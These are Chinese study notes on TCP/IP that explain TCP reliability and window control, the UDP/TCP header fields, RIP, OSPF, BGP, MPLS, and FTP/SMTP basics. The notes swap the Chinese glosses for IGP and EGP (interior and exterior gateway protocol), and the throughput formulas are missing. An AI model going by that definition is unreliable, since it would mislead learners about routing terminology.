限定于LAN等特定网络中的应用通信 广播通信（广播、多播） 3.TCP TCP与UDP的区别相当大。它充分地实现了数据传输时各种控制功能，可以进行丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。而这些在UDP中都没有。此外，TCP作为一种面向有连接的协议，只有在确认通信对端存在时才会发送数据，从而可以控制通信流量的浪费（由于UDP没有连接控制，所以即使对端从一开始就不存在或中途退出网络，数据包还是能够发送出去。（当ICMP错误返回时，有时也实现了不再发送的机制）） 。\nTCP的特点及其目的\n为了通过IP数据报实现可靠性传输，需要考虑很多事情，例如数据的破坏、丢包、重复以及分片顺序混乱等问题。如不能解决这些问题，也就无从谈起可靠传输。\nTCP通过==检验和、序列号、确认应答、重发控制、连接管理以及窗口控制等机制实现可靠性传输。==\n通过序列号与确认应答提高可靠性 在TCP中，当发送端的数据到达接收主机时，接收端主机会返回一个已收到消息的通知。这个消息叫做确认应答（ACK（ACK（Positive Acknowled-gement）意指已经接收） ）。\n此外，也有可能因为一些其他原因导致确认应答延迟到达，在源主机重发数据以后才到达的情况也履见不鲜。此时，源发送主机只要按照机制重发数据即可。但是对于目标主机来说，这简直是一种“灾难”。它会反复收到相同的数据。而为了对上层应用提供可靠的传输，必须得放弃重复的数据包。为此，就必须引入一种机制，它能够识别是否已经接 收数据，又能够判断是否需要接收。\n上述这些==确认应答处理、重发控制以及重复控制等功能都可以通过序列号实现==。序列号是按顺序给发送数据的每一个字节（8位字节）都标上号码的编号（序列号的初始值并非为0。而是在建立连接以后由随机数生成。而后面的计算则是对每一字节加一） 。接收端查询接收数据TCP首部中的序列号和数据的长度，将自己下一步应该接收的序号作为确认应答返送回去。就这样，通过序列号和确认应答号，TCP可以实现可靠传输。\n重发超时如何确定 TCP要求不论处在何种网络环境下都要提供高性能通信，并且无论网络拥堵情况发生何种变化，都必须保持这一特性。为此，它在每次发包时都会计算往返时间（Round Trip Time也叫RTT。是指报文段的往返时间。） 及其偏差（RTT时间波动的值、方差。有时也叫抖动。） 。将这个往返时间和偏差相加重发超时的时间，就是比这个总和要稍大一点的值。\n数据被重发之后若还是收不到确认应答，则进行再次发送。此时，等待确认应答的时间将会以2倍、4倍的指数函数延长。\n连接管理 UDP是一种面向无连接的通信协议，因此不检查对端是否可以通信，直接将UDP包发送出去。TCP与此相反，它会在数据通信之前，通过TCP首部发送一个SYN包作为建立连接的请求等待确认应答（TCP中发送第一个SYN包的一方叫做客户端，接收这个的一方叫做服务端） 。如果对端发来确认应答，则认为可以进行数据通信。如果对端的确认应答未能到达，就不会进行数据通信。此外，在通信结束时会进行断开连接的处理（FIN包）。\n可以使用TCP首部用于控制的字段来管理TCP连接（也叫控制域） 。==一个连接的建立与断开，正常过程至少需要来回发送7个包才能完成（建立一个TCP连接需要发送3个包。这个过 程也称作**“三次握手”**==） 。\nTCP以段为单位发送数据 在建立TCP连接的同时，也可以确定发送数据包的单位，我们也可以称其为==“最大消息长度”（MSS：Maximum Segment Size）==。\nTCP在传送大量数据时，是以MSS的大小将数据进行分割发送。进行重发时也是以MSS为单位。\nMSS是在三次握手的时候，在两端主机之间被计算得出。两端的主机在发出建立连接的请求时，会在TCP首部中写入MSS选项，告诉对方自己的接口能够适应的MSS的大小（为附加MSS选项，TCP首部将不再是20字节，而是4字节的整数倍。如图6.13所示的+4。） 。然后会在两者之间选择一个较小的值投入使用。\n利用窗口控制提高速度 TCP以1个段为单位，每发一个段进行一次确认应答的处理。这样的传输方式有一个缺点。那就是，包的往返时间越长通信性能就越低。\n为解决这个问题，TCP引入了窗口这个概念。即使在往返时间较长的情况下，它也能控制网络性能的下降。图6.15所示，确认应答不再是以每个分段，而是以更大的单位进行确认时，转发时间将会被大幅度的缩短。也就是说，发送端主机，==在发送了一个段以后不必要一直等待确认应答，而是继续发送==。\n==窗口大小就是指无需等待确认应答而可以继续发送数据的最大值==。图6.15中，窗口大小为4个段。\n这个机制实现了使用大量的缓冲区，通过对多个段同时进行确认应答的功能。\n如图6.16所示，发送数据中高亮圈起的部分正是前面所提到的窗口。在这个窗口内的数据即便没有收到确认应答也可以发送出去。此外，从该窗口中能看到的数据因其某种数据已在传输中丢失，所以发送端才能收到确认应答，这种情况也需进行重发。为此，==发送端主机在等到确认应答返回之前，必须在缓冲区中保留这部分数据==。\n收到确认应答的情况下，将窗口滑动到确认应答中的序列号的位置。这样可以顺序地将多个段同时发送提高通信性能。这种机制也被称为==滑动窗口控制==。\n窗口控制与重发控制 在使用窗口控制中，如果出现段丢失该怎么办？\n首先，我们先考虑确认应答未能返回的情况。在这种情况下，==数据已经到达对端，是不需要再进行重发的==。然而，在没有使用窗口控制的时候，没有收到确认应答的数据都会被重发。而使用了窗口控制，就如图6.17所示，某些确认应答即便丢失也无需重发。\n其次，我们来考虑一下某个报文段丢失的情况。如图6.18所示，接收主机如果收到一个自己应该接收的序号以外的数据时，会针对当前为止收到数据返回确认应答（==不过即使接收端主机收到的包序号并不连续，也不会将数据丢弃而是暂时保存至缓冲区中==） 。\n如图6.18所示。==当某一报文段丢失后，发送端会一直收到序号为1001的确认应答==，这个确认应答好像在提醒发送端“我想接收的是从1001开始的数据”。因此，在窗口比较大，又出现报文段丢失的情况下，同一个序号的确认应答将会被重复不断地返回。而发送端主机如果连续3次收到同一个确认应答（之所以连续收到3次而不是两次的理由是因为，即使数据段的序号被替换两次也不会触发重发机制） ，就会将其所对应的数据进行重发。这种机制比之前提到的超时管理更加高 效，因此也被称作==高速重发控制==。\n流控制 TCP提供一种机制可以让发送端根据接收端的实际接收能力控制发送的数据量。这就是所谓的==流控制==。它的具体操作是，接收端主机向发送端主机通知自己可以接收数据的大小，于是发送端会发送不超过这个限度的数据。该大小限度就被称==窗口大小==。在前面6.4.6节中所介绍的窗口大小的值就是由接收端主机决定的。\nTCP首部中，专门有一个字段用来通知窗口大小。接收主机将自己可以接收的缓冲区大小放入这个字段中通知给发送端。这个字段的值越大，说明网络的吞吐量越高。 不过，接收端的这个缓冲区一旦面临数据溢出时，窗口大小的值也 会随之被设置为一个更小的值通知给发送端，从而控制数据发送量。也就是说，发送端主机会根据接收端主机的指示，对发送数据的量进行控制。这也就形成了一个完整的==TCP流控制（流量控制）==。\n如图6.19所示，当接收端收到从3001号开始的数据段后其缓冲区即满，不得不暂时停止接收数据。之后，在收到发送窗口更新通知后通信才得以继续进行。如果这个窗口的更新通知在传送途中丢失，可能会导致无法继续通信。为避免此类问题的发生，发送端主机会时不时的发送一个叫做窗口探测的数据段，此数据段仅含一个字节以获取最新的窗口大小信息。\n拥塞控制 有了TCP的窗口控制，收发主机之间即使不再以一个数据段为单位发送确认应答，也能够连续发送大量数据包。然而，如果在通信刚开始时就发送大量数据，也可能会引发其他问题。\n一般来说，计算机网络都处在一个共享的环境。因此也有可能会因为其他主机之间的通信使得网络拥堵。在网络出现拥堵时，如果突然发送一个较大量的数据，极有可能会导致整个网络的瘫痪。\nTCP为了防止该问题的出现，在通信一开始时就会通过一个叫做==慢启动==的算法得出的数值，对发送数据量进行控制。\n提高网络利用率的规范 ■ Nagle算法\n该算法是指发送端即使还有应该发送的数据，但如果这部分数据很少的话，则进行延迟发送的一种处理机制。具体来说，就是仅在下列任意一种条件下才能发送数据。如果两个条件都不满足，那么暂时等待一段时间以后再进行数据发送。\n已发送的数据都已经收到确认应答时 可以发送最大段长度（MSS）的数据时 ■ 延迟确认应答\n接收数据的主机如果每次都立刻回复确认应答的话，可能会返回一个较小的窗口。那是因为刚接收完数据，缓冲区已满。当某个接收端收到这个小窗口的通知以后，会以它为上限发送数据，从而又降低了网络的利用率（这其实是窗口控制特有的问题，专门术语叫做糊涂窗口综合征（SWS：Silly Window Syndrome）） 。为 此，引入了一个方法，那就是==收到数据以后并不立即返回确认应答，而是延迟一段时间的机制==。\n在没有收到2×最大段长度的数据为止不做确认应答（根据操作系统的不同，有时也有不论数据大小，只要收到两个包就即刻返回确认应答的情况） 其他情况下，最大延迟0.5秒发送确认应答（如果延迟多于0.5秒可能会导致发送端重发数据） （很多操作系统设置为0.2秒左右（这个时间越小、CPU的负荷会越高，性能也下降。反之，这个时间越长，越有可能触发发送主机的重发处理，而窗口为只有1个数据段的时候，性能也会下降） ） 事实上，大可不必为每一个数据段都进行一次确认应答。TCP采用滑动窗口的控制机制，因此通常确认应答少一些也无妨。TCP文件传输中，绝大多数是每两个数据段返回一次确认应答。\n■ 捎带应答\n根据应用层协议，发送出去的消息到达对端，对端进行处理以后， 会返回一个回执。\n在此类通信当中，==TCP的确认应答和回执数据可以通过一个包发送==。这种方式叫做捎带应答。通过这种机制，可以使收发的数据量减少。\n4.其他传输层协议 UDP-Lite\nSCTP\nDCCP\n5.UDP首部的格式 ■ 校验和（Checksum）\n校验和是为了提供可靠的UDP首部和数据而设计。在计算校验和时，如图6.25所示，附加在UDP伪首部与UDP数据报之前。\n==■ 校验和计算中计算UDP伪首部的理由==\n为什么在进行校验和计算时，也要计算UDP伪首部呢？关于这个问题，与6.2节中所介绍的内容有所关联。\nTCP/IP中识别一个进行通信的应用需要5大要素，它们分别为“源IP地址”、“目标IP地址”、“源端口”、“目标端口”、“协议号”。然而，在UDP的首部中只包含它们当中的两项（源端口和目标端口），余下的3项都包含在IP首部里。\n假定其他3项的信息被破坏会产生什么样的后果呢？很显然，这极有可能会导致应该收包的应用收不到包，不该收到包的应用却收到了包。\n为了避免这类问题，有必要验证一个通信中必要的5项识别码是否正确。为此，在校验和的计算中就引入了伪首部的概念。\n此外，IPv6中的IP首部没有校验和字段。TCP或UDP通过伪首部，得以对5项数字进行校验，从而实现即使在IP首部并不可靠的情况下仍然能够提供可靠的通信传输。\n6.TCP首部格式 ■ 序列号（Sequence Number）\n字段长32位。序列号（有时也叫序号）是指发送数据的位置。每发送一次数据，就累加一次该数据字节数的大小。\n■ 控制位（Control Flag）\n字段长为8位，每一位从左至右分别为CWR、ECE、URG、ACK、PSH、RST、SYN、FIN。这些控制标志也叫做控制位。当它们对应位上的值为1时，具体含义如图6.27所示。\nCWR（Congestion Window Reduced） CWR标志（关于CWR标志的设定请参考5.8.4节。） 与后面的ECE标志都用于IP首部的ECN字段。ECE标志为1时，则通知对方已将拥塞窗口缩小。\nECE（ECN-Echo） ECE标志（关于ECE标志的设定请参考5.8.4节。） 表示ECN-Echo。置为1会通知通信对方，从对方到这边的网络有拥塞。在收到数据包的IP首部中ECN为1时将TCP首部中的ECE设置为1。\nURG（Urgent Flag） 该位为1时，表示包中有需要紧急处理的数据。对于需要紧急处理的数据，会在后面的紧急指针中再进行解释。\nACK（Acknowledgement Flag） 该位为1时，确认应答的字段变为有效。TCP规定除了最初建立连接时的SYN包之外该位必须设置为1。\nPSH（Push Flag） 该位为1时，表示需要将受到的数据立刻传给上层应用协议。PSH为0时，则不需要立即传而是先进行缓存。\nRST（Reset Flag） 该位为1时表示TCP连接中出现异常必须强制断开连接。例如，一个没有被使用的端口即使发来连接请求，也无法进行通信。此时就可以返回一个RST设置为1的包。此外，程序宕掉或切断电源等原因导致主机重启的情况下，由于所有的连接信息将全部被初始化，所以原有的TCP通信也将不能继续进行。这种情况下，如果通信对方发送一个设置为1的RST包，就会使通信强制断开连接。\nSYN（Synchronize Flag） 用于建立连接。SYN为1表示希望建立连接，并在其序列号的字段进行序列号初始值的设定（Synchronize本身有同步的意思。也就意味着建立连接的双方，序列号和确认应答号要保持同步） 。\nFIN（Fin Flag） 该位为1时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换FIN位置为1的TCP段。每个主机又对对方的FIN包进行确认应答以后就可以断开连接。不过，主机收到FIN设置为1的TCP段以后不必马上回复一个FIN包，而是可以等到缓冲区中的所有数据都因已成功发送而被自动删除之后再发。\n■ 校验和（Checksum）\nTCP的校验和与UDP相似，区别在于TCP的校验和无法关闭。\n==■ 使用校验和的目的是什么？==\n有噪声干扰的通信途中如果出现位错误，可以由数据链路的FCS检查出来。那么为什么TCP或UDP中也需要校验和呢？\n其实，相比检查噪声影响导致的错误，TCP与UDP的校验和更是一种==进行路由器内存故障或程序漏洞导致的数据是否被破坏的检查==。\n有过C语言编程经验的人都知道，如果指针使用不当，极有可能会破坏内存中的数据结构。路由器的程序中也可能会存在漏洞，或程序异常宕掉的可能。在互联网中发送数据包要经由好多个路由器，一旦在发送途中的某一个路由器发生故障，经过此路由器的包、协议首部或数据就极有可能被破坏。即使在这种情况下，TCP或UDP如果能够提供校验和计算，也可以判断协议首部和数据是否被破坏。\n■ 窗口大小与吞吐量\nTCP通信的最大吞吐量由窗口大小和往返时间决定。假定最大吞吐量为Tmax ，窗口大小为W，往返时间是RTT的话，那么最大吞吐量的公式如下：\n假设窗口为65535字节，RTT为0.1秒，那么最大吞吐量Tmax 如下：\n以上公式表示1个TCP连接所能传输的最大吞吐量为5.2Mbps。如果建立两个以上连接同时进行传输时，这个公式的计算结果则表示==每个连接的最大吞吐量==。也就是说，==在TCP中，与其使用一个连接传输数据，使用多个连接传输数据会达到更高的网络吞吐量==。==在Web浏览器中一般会通过同时建立4个左右连接来提高吞吐量==\n第7章 路由协议 互联网是由路由器连接的网络组合而成的。为了能让数据包正确达地到达目标主机，路由器必须在途中进行正确地转发。这种向“正确的方向”转发数据所进行的处理就叫做==路由控制或路由==。\n路由器根据==路由控制表（Routing Table）==转发数据包。它根据所收到的数据包中目标主机的IP地址与路由控制表的比较得出下一个应该接收的路由器。因此，这个过程中路由控制表的记录一定要正确无误。但凡出现错误，数据包就有可能无法到达目标主机。\n1.静态路由与动态路由 静态路由是指事先设置好路由器和主机中并将路由信息固定的一种方法。而动态路由是指让路由协议在运行过程中自动地设置路由控制信息的一种方法。\n动态路由如图7.2所示，会给相邻路由器发送自己已知的网络连接信息，而这些信息又像接力一样依次传递给其他路由器，直至整个网络都了解时，路由控制表也就制作完成了。而此时也就可以正确转发IP数据包了（图7.2中的传输，只有在没有循环的情况下才能很好地运行。例如路由器C和路由器D之间如果有连接，那么将无法正常工作） 。\n2.路由控制范围 随着IP网络的发展，想要对所有网络统一管理是不可能的事。因此，人们根据路由控制的范围常使用==IGP（Interior Gateway Protocol，外部网关协议）和EGP（Exterior Gateway Protocol，内部网关协议）==（EGP是特定的路由协议名称，请不要与其他同名词汇混淆） 两种类型的路由协议。\n自治系统与路由协议 企业内部网络的管理方针，往往由该企业组织内部自行决定。因此每个企业或组织机构对网络管理和运维的方法都不尽相同。为了提高自己的销售额和生产力，各家企业和组织机构都会相应购入必要的机械设备、构建合适的网络以及采用合理的运维体制。在这种环境下，可以对 公司以外的人士屏蔽企业内部的网络细节，更不必对这些细节上的更新 请求作出回应。这好比我们的日常生活，每个人对家庭内部的私事，都不希望过多暴露给外界，听从外界指挥。\n==制定自己的路由策略，并以此为准在一个或多个网络群体中采用的小型单位叫做自治系统（AS：Autonomous System）或路由选择域（Routing Domain）==。\n==自治系统（路由选择域）内部动态路由采用的协议是域内路由协议，即IGP。而自治系统之间的路由控制采用的是域间路由协议，即 EGP。==\nIGP中还可以使用==RIP（Routing Information Protocol，路由信息协议）、RIP2、OSPF（Open Shortest Path First，开放式最短路径优先）等众多协议。与之相对，EGP使用的BGP（Border Gateway Protocol，边界网关协议）协议==。\n3.路由算法 路由控制有各种各样的算法，其中最具代表性的有两种，是==距离向量（Distance-Vector）算法==和==链路状态（Link-State）算法==。\n距离向量算法 距离向量算法（DV）是指根据距离（代价（Metric是指转发数据 时衡量路由控制中距离和成本的一种指标。在距离向量算法中，代价相当于所要经过的路由器的个数） ）和方向决定目标网络或目标主机位置的一种方法。\n路由器之间可以互换目标网络的方向及其距离的相关信息，并以这些信息为基础制作路由控制表。这种方法在处理上比较简单，不过由于只有距离和方向的信息，所以当网络构造变得分外复杂时，在获得稳定的路由信息之前需要消耗一定时间（也叫做==路由收敛==） ，也极易发生路由循环等问题。\n链路状态算法 链路状态算法是路由器在了解网络整体连接状态的基础上生成路由控制表的一种方法。该方法中，==每个路由器必须保持同样的信息才能进行正确的路由选择==。\n距离向量算法中每个路由器掌握的信息都不相同。通往每个网络所耗的距离（代价）也根据路由器的不同而不同。因此，该算法的一个缺点就是不太容易判断每个路由器上的信息是否正确。\n而链路状态算法中所有路由器持有相同的信息。对于任何一台路由器，网络拓扑都完全一样。因此，只要某一台路由器与其他路由器保持同样的路由控制信息，就意味着该路由器上的路由信息是正确的。\n为了实现上述机制，链路状态算法付出的代价就是如何从网络代理获取路由信息表。这一过程相当复杂，特别是在一个规模巨大而又复杂的网络结构中，管理和处理代理信息需要高速CPU处理能力和大量的内存（为此，==OSPF==正致力于将网络分割为不同的区域，以减少路由控制信息） 。\n主要路由协议 4.RIP ==RIP（Routing Information Protocol）是距离向量型的一种路由协议==，广泛用于LAN。被BSD UNIX作为标准而提供的routed（在UNIX系统上的一个守护进程。该进程实现了RIP协议） 采用了RIP，因此RIP得到了迅速的普及。\n广播路由控制信息\nRIP将路由控制信息定期（30秒一次）向全网广播。如果没有收到路由控制信息，连接就会被断开。不过，这有可能是由于丢包导致的，因此RIP规定等待5次。如果等了6次（180秒）仍未收到路由信息，才会真正关闭连接。\n根据距离向量确定路由 RIP基于距离向量算法决定路径。距离（Metrics）的单位为“跳数”。跳数是指所经过的路由器的个数。RIP希望尽可能少通过路由器将数据包转发到目标IP地址，如图7.7所示。根据距离向量生成距离向量表，再抽出较小的路由生成最终的路由控制表。\n使用子网掩码时的RIP处理（没看明白）\nRIP虽然不交换子网掩码信息，但可以用于使用子网掩码的网络环境。不过在这种情况下需要注意以下几点：\n从接口的IP地址对应分类得出网络地址后，与根据路由控制信息流过此路由器的包中的IP地址对应的分类得出的网络地址进行比较。 如果两者的网络地址相同，那么就以接口的网络地址长度为准。 如果两者的网络地址不同，那么以IP地址的分类所确定的网络地址长度为准。 例如，路由器的接口地址为192.168.1.33/27。很显然，这是一个C类地址，因此按照IP地址分类它的网络地址为192.168.1.33/24。与192.168.1.33/24相符合的IP地址，其网络地址长度都被视为27位。除此之外的地址，则采用每个地址的分类所确定的网络地址长度。\n因此，采用RIP进行路由控制的范围内必须注意两点：一是，因IP地址的分类而产生不同的网络地址时；二是，构造网络地址长度不同的网络环境时。\nRIP中路由变更时的处理 RIP的基本行为可归纳为如下两点：\n将自己所知道的路由信息定期进行广播。 一旦认为网络被断开，数据将无法流过此路由器，其他路由器也就可以得知网络已经断开。 不过，这两点不论哪种方式都存在一些问题。\n如图7.9，路由器A将网络A的连接信息发送给路由器B，路由器B又将自己掌握的路由信息在原来的基础上加1跳后发送给路由器A和路由器C。假定这时与网络A发生了故障。\n路由器A虽然觉察到自己与网络A的连接已经断开，无法将网络A的信息发送给路由器B，但是它会收到路由器B曾经获知的消息。这就使得路由器A误认为自己的信息还可以通过路由器B到达网络A。\n==像这样收到自己发出去的消息，这个问题被称为无限计数（Counting to Infinity）==。\n为了尽可能解决这个问题，人们提出了==“毒性逆转”（Poisoned Reverse）==和==“触发更新”（Triggered Update）==两种方法。\n==毒性逆转==是指当网络中发生链路被断开的时候，不是不再发送这个消息，而是将这个无法通信的消息传播出去。即发送一个距离为16的消息。==触发更新==是指当路由信息发生变化时，不等待30秒而是立刻发送出去的一种方法。有了这两种方法，在链路不通时，可以迅速传送消息以使路由信息尽快收敛。\nRIP2 RIP2的意思是RIP第二版。它是在RIP使用过程中总结了经验的基础上进行改良后的一种协议。第二版与第一版的工作机制基本相同，不过仍有如下几个新的特点。\n■ 使用多播\nRIP中当路由器之间交换路由信息时采用广播的形式，然而在RIP2中改用了多播。这样不仅减少了网络的流量，还缩小了对无关主机的影响。\n■ 支持子网掩码\n与OSPF类似的，RIP2支持在其交换的路由信息中加入子网掩码信息。\n■ 路由选择域\n与OSPF的区域类似，在同一个网络中可以使用逻辑上独立的多个RIP。\n■ 外部路由标志\n通常用于把从BGP等获得的路由控制信息通过RIP传递给AS内。\n■ 身份验证密钥\n与OSPF一样，RIP包中携带密码。只有在自己能够识别这个密码时才接收数据，否则忽略这个RIP包。\n5.OSPF OSPF是链路状态型路由协议 OSPF为链路状态型路由器。路由器之间交换链路状态生成网络拓扑信息，然后再根据这个拓扑信息生成路由控制表。\nRIP的路由选择，要求途中所经过的路由器个数越少越好。与之相比，OSPF可以给每条链路（实际上，可以为连到该数据链路（子网）的网卡设置一个代价。而这个代价只用于发送端，接收端不需要考虑） ==赋予一个权重==（也可以叫做代价），==并始终选择一个权重最小的路径作为最终路由==。也就是说OSPF以每个链路上的代价为度量标准，始终选择一个总的代价最小的一条路径。如图7.14对比所示，==RIP是选择路由器个数最少的路径，而OSPF是选择总的代价较小的路径==。\nOSPF基础知识 在OSPF中，把==连接到同一个链路的路由器称作相邻路由器（Neighboring Router）==。在一个相对简单的网络结构中，例如每个路由器仅跟一个路由器相互连接时（在专线网络中，路由器之间采用PPP相连） ，相邻路由器之间可以交换路由信息。但是在一个比较复杂的网络中，例如在同一个链路中加入了以太网或FDDI等路由器时，就不需要在所有相邻的路由器之间都进行控制信息的交换，而是确定一个==指定路由器（Designated Router）==，并以它为中心交换（邻接路由器中相互交换路由信息的关系叫做邻接（Adjancency）） 路由信息即可。\n在OSPF中，根据作用的不同可以分为5种类型的包。\n通过==发送问候（HELLO）包确认是否连接==。每个路由器为了同步路由控制信息，利用==数据库描述（Database Description）包相互发送路由摘要信息和版本信息==。如果版本比较老，则首先==发出一个链路状态请求（Link State Request）包请求路由控制信息==，然后由==链路状态更新（Link State Update）包接收路由状态信息==，最后再通过==链路状态确认（Link State ACK Packet）包通知大家本地已经接收到路由控制信息==。 有了这样一个机制以后，OSPF不仅可以大大地减少网络流量，还可以达到迅速更新路由信息的目的。\nOSPF工作原理概述 链路状态更新包所要传达的消息大致分为两类：一是网络LSA（Network Link State Advertisement，网络链路状态通告） ， 另一个是路由器LSA（Router Link State Advertisement，路由器链路状态通告） 。\n==网络LSA是以网络为中心生成的信息，表示这个网络都与哪些路由器相连接。而路由器LSA是以路由器为中心生成的信息，表示这个路由器与哪些网络相连接。==\n如果这两种信息 主要采用OSPF发送，每个路由器就都可以生成一个可以表示网络结构的链路状态数据库。可以根据这个数据库、采用Dijkstra算法生成相应的路由控制表。\n将区域分层化进行细分管理 链路状态型路由协议的潜在问题在于，当网络规模越来越大时，表示链路状态的拓扑数据库就变得越来越大，路由控制信息的计算也就越困难。==OSPF为了减少计算负荷，引入了区域的概念==。\n区域是指将连接在一起的网络和主机划分成小组，使一个自治系统（AS）内可以拥有多个区域。不过具有多个区域的==自治系统必须要有一个主干区域==（主干区域的ID为0。逻辑上只允许它有1个，可实际在物理上又可以划分为多个） （Backbone Area），并且所有其他区域必须都与这个主干区域相连接。\n连接区域与主干区域的路由器称作==区域边界路由器==；而区域内部的路由器叫做==内部路由器==；只与主干区域内连接的路由器叫做==主干路由器==；与外部相连接的路由器就是==AS边界路由器==。\n每个区域内的路由器都持有==本区域网络拓扑的数据库==。然而，==关于区域之外的路径信息，只能从区域边界路由器那里获知它们的距离==。区域边界路由器也不会将区域内的链路状态信息全部原样发送给其他区域，==只会发送自己到达这些路由器的距离信息==，内部路由器所持有的网络拓扑数据库就会明显变小。\n6.BGP ==BGP（Border Gateway Protocol），边界网关协议是连接不同组织机构（或者说连接不同自治系统）的一种协议。因此，它属于外部网关协议（EGP）==。具体划分，它主要用于ISP之间相连接的部分。只有BGP、RIP和OSPF共同进行路由控制，才能够进行整个互联网的路由控制。\nBGP与AS号 ISP、区域网络等会将每个网络域编配成一个个自治系统（AS： Autonomous System）进行管理。它们==为每个自治系统分配一个16比特的AS编号==。\nBGP就是根据这个编号进行相应的路由控制。\n有了AS编号的域，就相当于有了自己一个独立的“国家”。==AS的代表可以决定AS内部的网络运营和相关决策==。与其他AS相连的时候，可 以像一位“外交官”一样签署合约再进行连接（也叫对接（Peering）） 。\nBGP是路径向量协议 ==根据BGP交换路由控制信息的路由器叫做BGP扬声器==。BGP扬声器为了在AS之间交换BGP信息，必须与所有AS建立对等的BGP连接。\nBGP中数据包送达目标网络时，会生成一个中途经过所有AS的编号列表。==这个表格也叫做AS路径信息访问列表（AS Path List）==。如果针对同一个目标地址出现多条路径时，BGP会从AS路径信息访问列表中选择一个较短的路由。\n在AS路径信息访问列表中不仅包含转发方向和距离，还涵盖了途径所有AS的编号。因此==它不是一个距离向量型协议==。此外，对网络构造仅用一元化表示，因此也==不属于链路状态型协议==。==像BGP这种根据所要经过的路径信息访问列表进行路由控制的协议属于路径向量（Path Vector）型协议==。作为距离向量型的RIP协议，因为无法检测出环路， 所以可能发生无限计数的问题（路由进入稳定状态需要一定时间、网络跳数不可超过15等限制，导致无法应用于大型的网络等问题） 。==而路径向量型由于能够检测出环路，避免了无线计数的问题，所以令网络更容易进入一个稳定的状态。同时，它还有支持策略路由（策略路由控制是指在发送数据包时，可以选择或指定所要通过的AS的意思。） 的优势==。\n7.MPLS 现如今，在转发IP数据包的过程中除了使用路由技术外，还在使用标记交换技术。路由技术基于IP地址中最长匹配原则进行转发，而==标记交换则对每个IP包都设定一个叫做“标记”的值，然后根据这个“标记”再进行转发。标记交换技术中最具代表性的当属多协议标记交换技术，即MPLS（Multi Protocol Label Switching）==。\n由于==基于标记的转发通常无法在路由器上进行==，所以MPLS也就无法被整个互联网采用。如图7.22所示，它的转发处理方式甚至与IP网也有所不同。\nMPLS的网络基本动作 MPLS网络中实现MPLS功能的路由器叫做==标记交换路由器（LSR，Label Switching Router）==。特别是与外部网路连接的那部分LSR叫做==标记边缘路由器（LER，Label Edge Router）==。MPLS正是在LER上对数据包进行追加标记和删除标记的操作。\n如图7.23展示了数据从以太网的IP网开始经过MPLS网再发送给其他IP网的整个转发过程。数据包在进入MPLS时，在其IP首部的前面被追加了32比特的垫片头（其中包含20比特的标记值）（有时也可能会被追加多个垫片头） 。MPLS网络内，根据垫片头中的标记进一步进行转发。当数据离开MPLS时，垫片头就被去除。在此我们称==附加标记转发的动作为Push，替换标记转发的动作为Swap，去掉标记转发的动作为Pop==。\nMPLS中目标地址和数据包（它们被称作FEC（Forward-ing Equivalence Class），是指具有相同特性的报文） 都要通过由标记决定的同一个路径，这个路径叫做==标记交换路径（LSP，Label Switch Path）==。LSP又可以划分为一对一连接的点对点LSP，和一对多绑定的合并LSP两类。\nMPLS的优点 MPLS的优势可归纳为两点。==第一个是转发速度快==。通常，路由器转发IP数据包时，首先要对目标地址和路由控制表中可变长的网络地址进行比较，然后从中选出最长匹配的路径才能进行转发。MPLS则不然。==它使用固定长度的标记信息，使得处理更加简单，可以通过高速的硬件实现转发==（现在的路由器也更趋向于硬件化） 。此外，相比互联网中的主干路由器需要保存大量路由表才能进行处理的现状，==MPLS只需要设置必要的几处信息即可，所要处理的数据量也大幅度减少。==而且除了IPv4、IPv6之外，针对其他协议，MPLS仍然可以实现高速转发。\n第二个优势在于==利用标记生成虚拟的路径，并在它的上面实现IP等数据包的通信==。基于这些特点，被称之为“尽力而为”的IP网也可以提供基于MPLS的通信质量控制、带宽保证和VPN等功能。\n第8章 应用协议 1.远程登录 实现从自己的本地计算机登录到网络另一端计算功能的应用就叫做远程登录。\n远程登录主要使用TELNET和SSH（Secure SHell） 两种协议。\nTELNET\nTELNET利用TCP的一条连接，通过这一条连接向主机发送文字命令并在主机上执行。\nTELNET客户端通常与目标主机的23号端口建立连接，并与监听这个端口的服务端程序telnetd进行交互。当然，也可以与其他的TCP端口号连接，只要在该端口上有监听程序能够处理telnet请求即可。\n在一般的telnet命令：\ntelnet主机名 TCP端口号TCP端口号为21时可以连接到FTP（8.3节）应用，为25时可以连接到SMTP（8.4.4节），为80时可连接到HTTP（8.5节），为110时可连接到POP3（8.4.5节）。如此看来，每个服务器都有相应的端口号在等待连接。\n因此，以下两个命令可以视为相同：\nftp 主机名 telnet 主机名 21 SSH\nSSH是加密的远程登录系统。\n2.文件传输 FTP的工作机制概要\nFTP是通过怎样的机制才得以实现文件传输的呢？\n==它使用两条TCP连接：一条用来控制，另一条用于数据（文件）的传输。==\n==用于控制的TCP连接主要在FTP的控制部分使用。==例如登录用户名和密码的验证、发送文件的名称、发送方式的设置。利用这个连接，可以通过ASCII码字符串发送请求和接收应答。==在这个连接上无法发送数据，数据需要一个专门的TCP进行连接==。\n==FTP控制用的连接使用的是TCP21号端口。==在TCP21号端口上进行文件GET（RETR）、PUT（STOR）、以及文件一览（LIST）等操作时，==每次都会建立一个用于数据传输的TCP连接==。数据的传输和文件一览表的传输正是在这个新建的连接上进行。当数据传送完毕之后，传输数据的这条连接也会被断开，然后会在控制用的连接上继续进行命令或应答的处理。\n==数据传输用的TCP连接通常使用端口20。==不过可以用PORT命令修改为其他的值。最近，出于安全的考虑，普遍在数据传输用的端口号中使用随机数进行分配。\n3.电子邮件 电子邮件的工作机制\n提供电子邮件服务的协议叫做==SMTP（Simple Mail Transfer Protocol）==。SMTP为了实现高效发送邮件内容，在其传输层使用了TCP协议。\n在技术上改变了以往直接在发送端与接收端主机之间建立TCP连接的机制，而引进了一种==一直会连接电源的邮件服务器。==\n发送和接收端通过邮件服务器进行收发邮件。接收端从邮件服务器接收邮件时使用POP3（Post Office Protocol）协议。\n==电子邮件的机制由3部分组成，它们分别是邮件地址，数据格式以及发送协议。==\n邮件地址 使用电子邮件时需要拥有的地址叫做邮件地址。它就相当于通信地址和姓名。互联网中电子邮件地址的格式如下：\n名称@通信地址 例如，master@tcpip.kusa.ac.jp中的master为名称，tcpip.kusa.ac.jp为地址。电子邮件的地址和域名的构造相同。此处，kusa.ac.jp表示域名，tcpip则表示master接收邮件的主机名称或为发送邮件所用的子网名称。\n现在，电子邮件的发送地址由DNS进行管理。DNS中注册有邮件地址及其作为发送地址时对应的邮件服务器的域名。这些映射信息被称作==MX记录==。例如，kusa.ac.jp的MX（Mail 